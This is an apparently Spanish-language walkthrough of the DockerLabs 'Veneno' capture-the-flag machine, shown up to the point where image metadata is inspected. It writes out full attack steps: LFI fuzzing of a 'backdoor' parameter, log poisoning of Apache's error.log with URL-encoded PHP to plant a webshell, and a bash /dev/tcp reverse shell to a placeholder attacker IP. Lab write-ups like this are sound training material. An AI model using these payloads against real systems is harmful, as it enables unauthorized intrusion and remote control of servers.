En la máquina **Veneno** de **DockerLabs** explotaremos un **LFI** por el cual con un **Log Poisoning** obtendremos acceso a la máquina, realizaremos un movimiento lateral de usuario encontrando una contraseña, y obtendremos privilegios de **Root** encontrando su contraseña en los metadatos de una imagen.

## **Reconocimiento**

Lo primero que voy a realizar es un escaneo con *NMAP* para comprobar los puertos abiertos de la máquina.

```bash
nmap -p- --open --min-rate 5000 172.17.0.2 -n -Pn -oN allports
```

![picture](/assets/images/dockerlabs/ven3.png){: w="600" h="300" }

Volvemos a lanzar un escaneo más exhaustivo de los puertos encontrados, para identificar su versión, y lanzar una serie de scripts predeterminados de *NMAP*.

```bash 
nmap -p22,80 -sVC 172.17.0.2 -oN targeted
```

![picture](/assets/images/dockerlabs/ven4.png){: w="600" h="300" }

Al no encontrar nada interesante, voy al navegador para ver que está corriendo en el servicio web.

Encuentro una página por defecto de **Apache2**.

![picture](/assets/images/dockerlabs/ven5.png)

Utilizo la herramienta **Gobuster** para intentar encontrar archivos y directorios que cuelguen de la web mediante **Fuzzing**.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php -b 403,404 --no-error
```

Encontramos el directorio `/uploads` el cual está vacío, y un archivo `problems.php`.

![picture](/assets/images/dockerlabs/ven6.png)

El archivo `problems.php` me redirige a otra página por defecto de **Apache2**.

![picture](/assets/images/dockerlabs/ven7.png)

Viendo que es un archivo **PHP**, vamos a intentar encontrar una variable por la cual podamos obtener un **LFI** (*Local File Inclusion*) o un **RCE** (*Remote Code Execution*).

Para ello voy a utilizar la herramienta **FFUF**.

```bash 
ffuf -c -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://172.17.0.2/problems.php?FUZZ=/etc/passwd' -t 100 -fl 364
```

Obtenemos la variable `backdoor` con código exitoso.

![picture](/assets/images/dockerlabs/ven8.png)

Y podemos listar el contenido archivo `/etc/passwd`.

![picture](/assets/images/dockerlabs/ven9.png)

La idea al tener un **LFI** es intentar ejecutar un **Log Poisoning** o envenenamiento de logs.

Para ello intentando listar los archivos principales para envenenar los logs, tenemos acceso de lectura en `/var/etc/apache2/error.log`.

![picture](/assets/images/dockerlabs/ven10.png)

Como `error.log` solo guarda errores, tendremos que realizar un error controlado inyectando código **PHP**.

## **Explotación**


Al intentar listar un archivo **PHP** inexistente, creamos un error y si recargamos la página podemos ver que nos lo muestra.

```bash
curl "http://172.17.0.2/hola.php"
```

![picture](/assets/images/dockerlabs/ven11.png){: w="600" h="300" }

![picture](/assets/images/dockerlabs/ven12.png)

Si conseguimos introducir código **PHP** nos lo ejecutará.

Pero si lo introducimos sin codificación **URL**  nos dará un error debido a como el servidor interpreta las **URLs**, y como algunos caracteres especiales pueden interferir en la petición **HTTP**.

- Sin codificar
	
	```bash
	curl "http://172.17.0.2/<?php system(‘whoami’) ?>.php"
    ```
	
	![picture](/assets/images/dockerlabs/ven13.png)

- Codificado
	
	```bash
	curl "http://172.17.0.2/%3C%3fphp%20system('whoami');%20%3f%3E.php"
    ```
	
	![picture](/assets/images/dockerlabs/ven14.png){: w="600" h="300" }

Y si vamos al archivo `error.log` comprobamos que nos ha ejecutado el código.

![picture](/assets/images/dockerlabs/ven15.png)

A continuación, la idea es subir una `webshell`.

- Sin codificar
	
	```bash
	curl 'http://172.17.0.2/<?php system($_GET["cmd"]);?>.php'
	```

- Codificado
	
	```bash
	curl 'http://172.17.0.2/%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E.php'
	```

![picture](/assets/images/dockerlabs/ven16.png){: w="600" h="300" }

Una vez la hemos mandado, nos vamos a la **URL** e introducimos lo siguiente ``erro.log&cmd=<comando>``

![picture](/assets/images/dockerlabs/ven17.png)

Y podemos comprobar que nos ejecuta el comando

![picture](/assets/images/dockerlabs/ven18.png)

Ya con la capacidad de ejecutar comandos, voy a lanzarme una **Reverse Shell**, para ello me pongo en escucha por un puerto con **netcat**.

```bash
nc -lnvp 4444
```

Y lanzo una **Reverse Shell** desde el navegador.

```bash
&cmd=bash -c 'bash -i %3E%26 /dev/tcp/<IP>/4444 0%3E%261'
```

Y obtenemos la ``shell`` interactiva en nuestra máquina local.

![picture](/assets/images/dockerlabs/ven19.png){: w="600" h="300" }

Realizo un tratamiento de la `TTY`, para obtener una ``shell`` más limpia.

## **Escalada de privilegios**

Viendo los archivos en el directorio actual encuentro un archivo cuyo contenido me indica que la contraseña del usuario está en algún archivo del sistema.

![picture](/assets/images/dockerlabs/ven20.png)

Buscando con el comando `find` encontramos el siguiente archivo.

```bash
find / -type f -name *.txt 2>/dev/null
```

![picture](/assets/images/dockerlabs/ven21.png){: w="600" h="300" }

Intentamos acceder como el usuario **carlos**, y la contraseña encontrada en el archivo es correcta.

![picture](/assets/images/dockerlabs/ven22.png)

En el directorio `/home` de **carlos** encontramos muchísimas carpetas.

![picture](/assets/images/dockerlabs/ven23.png)

Realizando un `ls -la` encuentro una imagen en la carpeta 55.

![picture](/assets/images/dockerlabs/ven24.png){: w="600" h="300" }

Me la traigo a mi máquina local para ver que es, y comprobar si puedo extraer metadatos.

```bash
python3 -m http.server 1234
```

```bash
wget http://172.17.0.2:1234/.toor.jpg
```

![picture](/assets/images/dockerlabs/ven25.png)

Listando los metadatos de la imagen vemos lo siguiente.

![picture](/assets/images/dockerlabs/ven26.png)
